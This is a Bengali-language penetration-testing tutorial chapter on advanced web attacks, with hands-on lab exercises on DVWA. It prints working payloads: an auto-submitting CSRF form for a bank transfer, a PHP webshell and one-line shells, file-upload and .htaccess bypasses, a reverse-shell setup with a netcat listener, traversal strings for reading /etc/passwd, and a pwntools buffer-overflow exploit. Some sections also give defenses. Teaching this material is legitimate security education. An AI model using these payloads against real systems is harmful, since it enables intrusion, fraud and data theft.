# অধ্যায় ২৫: Advanced Web Attacks

## সহজ কথায়:
OWASP Top 10 তো জানো। এখন আরো advanced attacks — যেগুলো real-world pentest-এ লাগে।

---

## ২৫.১ CSRF (Cross-Site Request Forgery)

CSRF = victim-এর browser থেকে malicious request পাঠানো (ভিকটিম unaware)।

### How CSRF Works:

```
1. Victim logged in → bank.com (session cookie)
2. Victim visits attacker.com (evil site)
3. attacker.com has hidden form:
   <form action="https://bank.com/transfer" method="POST">
     <input name="amount" value="10000">
     <input name="to" value="attacker">
   </form>
   <script>document.forms[0].submit()</script>
4. Browser → POST to bank.com with victim's cookie!
5. $10000 transfer → attacker account
```

### CSRF Exploit Code:

```html
<!-- CSRF Payload — Auto-submit form -->
<html>
<body>
<h1>Check out this cute cat!</h1>
<img src="cat.jpg">

<!-- Hidden CSRF form -->
<form id="csrf" action="https://victim-bank.com/transfer" method="POST" target="hidden-frame">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="account" value="attacker-123">
</form>
<iframe name="hidden-frame" style="display:none"></iframe>
<script>
  document.getElementById('csrf').submit();
</script>
</body>
</html>
```

### Defense:

```html
<!-- CSRF Token — form submit-এর সময় unique token check -->
<input type="hidden" name="csrf_token" value="random-unique-token-123">

<!-- SameSite Cookie -->
Set-Cookie: session=abc123; SameSite=Strict

<!-- Referer header check -->
if (request.headers.referer != "https://bank.com") reject
```

---

## ২৫.২ File Upload Bypass — Reverse Shell Upload

File upload functionality miss-use করে webshell upload।

### Bypass Techniques:

```bash
# 1. Extension bypass:
shell.php
shell.php.jpg         # Double extension
shell.php;.jpg        # Null byte (old)
shell.pHp             # Case change
shell.php5            # Alternate extension
.php.jpg              # Reverse extension

# 2. Content-Type bypass:
Content-Type: image/jpeg  # কিন্তু content = PHP code

# 3. Magic bytes bypass:
# File-এর শুরুতে image magic bytes যোগ করো:
GIF89a<?php system($_GET['c']); ?>

# 4. Size bypass:
# খুব ছোট file (শুধু <?=`$_GET[c]`;?>)

# 5. .htaccess bypass (allow .php files in upload dir):
# Upload .htaccess first:
AddType application/x-httpd-php .txt
# Then upload shell.txt → PHP execute হবে!
```

### PHP Reverse Shell:

```php
<?php
// 🔴 webshell.php — আপলোড করলেই পূর্ণাঙ্গ shell
// Usage: http://target.com/uploads/webshell.php?cmd=id

$cmd = $_GET['cmd'] ?? $_POST['cmd'] ?? '';
if ($cmd) {
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}

// বোনাস: file upload feature
if ($_FILES['file']) {
    move_uploaded_file($_FILES['file']['tmp_name'], './' . $_FILES['file']['name']);
    echo "Uploaded: " . $_FILES['file']['name'];
}
?>
```

### PentestMonkey PHP Reverse Shell:

```bash
# Download from Kali:
cp /usr/share/webshells/php/php-reverse-shell.php .

# Edit IP and port:
$ip = '192.168.1.5';    # তোমার IP
$port = 4444;           # তোমার port

# Upload → then listen:
nc -lvnp 4444
# Browser: http://target.com/shell.php
# → Shell পাবে!
```

---

## ২৫.৩ Directory Traversal

`../../../etc/passwd` — file system-এ navigate করা।

### Exploit:

```bash
# Normal:
GET /download?file=report.pdf

# Directory Traversal:
GET /download?file=../../../etc/passwd
GET /download?file=../../../../windows/win.ini
GET /download?file=....//....//....//etc/passwd

# URL encode:
GET /download?file=%2e%2e%2f%2e%2e%2fetc/passwd

# Bypass:
GET /download?file=....//....//....//etc/passwd
GET /download?file=..%252f..%252f..%252fetc/passwd  # Double URL decode

# Windows:
GET /download?file=..\..\..\windows\system32\drivers\etc\hosts
```

### Defense:

```php
<?php
// ✅ Safe — basename ব্যবহার + path check
$file = basename($_GET['file']);
$path = '/var/www/files/' . $file;
if (strpos(realpath($path), '/var/www/files/') === 0) {
    readfile($path);
}
?>
```

---

## ২৫.৪ Buffer Overflow

Buffer overflow = memory corruption → code execution।

### C Vulnerable Code:

```c
// 🚫 buffer_overflow.c — দুর্বল program
#include <stdio.h>
#include <string.h>

void vulnerable() {
    char buffer[64];          // 64 bytes buffer
    gets(buffer);             // 🚫 No bounds check!
    printf("Hello: %s\n", buffer);
}

int main() {
    vulnerable();
    return 0;
}
```

### Compile & Exploit:

```bash
# Compile (disable protections for learning):
gcc -o vuln -fno-stack-protector -z execstack buffer_overflow.c

# Normal usage:
./vuln
Input: Hello World
Output: Hello: Hello World

# Overflow:
./vuln
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
# → Segmentation fault (memory corrupted!)

# Find offset using pattern:
gdb ./vuln
pattern create 100
run
pattern offset $eip  # Find return address location
```

### With pwntools (Python):

```python
from pwn import *

# Target
payload = b"A" * 76          # Buffer padding (find offset)
payload += p32(0x08048444)   # Overwrite return address (win function)
payload += b"\x90" * 16     # NOP sled

# Send
p = process('./vuln')
p.sendline(payload)
p.interactive()
```

### Defense:

```bash
# Modern protections:
gcc -o safe -fstack-protector-strong -D_FORTIFY_SOURCE=2 buffer_overflow.c
```

---

## ২৫.৫ Hacking PDF Files

### PDF-এ Embedded Exploit:

```bash
# Craft malicious PDF (educational):
# 1. PDF with JavaScript
# 2. Open action exploit
# 3. Embedded file

# Tool: make-pdf
python make-pdf.py exploit.pdf

# Read PDF metadata:
pdfinfo exploit.pdf
pdftotext exploit.pdf

# PDF analysis:
peepdf exploit.pdf
```

### PDF Metadata Hiding:

```bash
# Remove metadata:
exiftool -all= document.pdf

# Check metadata:
exiftool document.pdf
```

---

## 💡 ল্যাব এক্সারসাইজ

```
১. CSRF:
   - DVWA → CSRF
   - CSRF form তৈরি করো
   - Password change CSRF বুঝো

২. File Upload:
   - DVWA → File Upload
   - webshell.php upload
   - Bypass technique test করো

৩. Directory Traversal:
   - DVWA → File Inclusion
   - /etc/passwd পড়ার চেষ্টা করো
   - Bypass technique

৪. Buffer Overflow:
   - উপরের C code compile করো
   - gdb দিয়ে exploit বুঝো
```

---

## 📌 মনে রাখো

| Attack | Vulnerability | Impact |
|--------|--------------|--------|
| **CSRF** | No token check | Action without consent |
| **File Upload** | No validation | Remote code execution |
| **Directory Traversal** | Path not sanitized | File read |
| **Buffer Overflow** | No bounds check | Code execution |
| **PDF Hack** | Embedded script | Malware delivery |

**পরবর্তী — Gain Access / Maintain Access / Clearing Tracks 🔐**
